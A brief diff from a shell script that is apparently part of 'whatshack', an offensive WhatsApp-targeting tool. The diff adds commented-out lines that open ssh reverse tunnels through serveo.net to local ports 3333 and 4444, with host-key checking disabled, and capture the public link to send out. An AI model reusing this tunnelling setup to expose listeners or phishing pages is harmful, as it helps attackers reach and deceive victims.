@@ -3,6 +3,11 @@
 # Author: @thelinuxchoice (You don't become a coder by just changing the credits)
 # Instagram: @linux_choice
 # Github: https://github.com/thelinuxchoice/whatshack
+#fi
+
+#$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$port':localhost:4444 2> /dev/null > sendlink ' &
+#sleep 7
+#send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
 host="159.89.214.31" #Serveo.net
 
